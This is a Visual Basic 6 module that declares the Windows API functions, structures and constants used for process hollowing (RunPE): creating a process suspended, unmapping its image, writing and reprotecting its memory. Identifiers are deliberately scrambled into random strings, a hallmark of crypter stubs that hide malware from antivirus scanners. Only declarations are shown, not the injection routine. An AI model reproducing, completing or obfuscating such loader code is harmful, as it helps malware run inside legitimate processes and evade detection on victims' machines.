Attribute VB_Name = "mPrtdrc"
Option Explicit

'========Process creation and memory access staff=========
Public Type PROCESS_INFORMATION
   qxijiqxixuuqcxuqixxxxxq As Long
   dsjodidsidodioddspppoxc As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
   cb As Long
   soioioqsiooiosssssssq As String
   ggfgfgfggfgfuzie As String
   fqjifilqfjhakfkjkhjfkljhhf As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   soioioqsiooiosssssssq2 As Long        'LPBYTE
   HDGInput As Long
   HDGOutput As Long
   HDGError As Long
End Type

Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal alalallaallaopooppoo As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal binchalderitHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal qxijiqxixuuqcxuqixxxxxq As Long, ByVal czacieghigvfhojahevjcskmcmzf As Long) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal qxijiqxixuuqcxuqixxxxxq As Long, sfijoqafjqkjoskokjeokjpdxd As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal qxijiqxixuuqcxuqixxxxxq As Long, sfijoqafjqkjoskokjeokjpdxd As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal qxijiqxixuuqcxuqixxxxxq As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualProtectEx Lib "kernel32" (ByVal qxijiqxixuuqcxuqixxxxxq As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal skofkioqiofkkoekkkook As Long) As Long

Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const kpahdffXECUTE_READWRITE As Long = &H40
Public Const kpahdffXECUTE_WRITECOPY As Long = &H80
Public Const kpahdffXECUTE_READ As Long = &H20
Public Const kpahdffXECUTE As Long = &H10
Public Const mootlvopkbopkkjokotktlfomc As Long = &H2
Public Const szcijixjxjxwlwlwwojijcosjxmlkCOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4
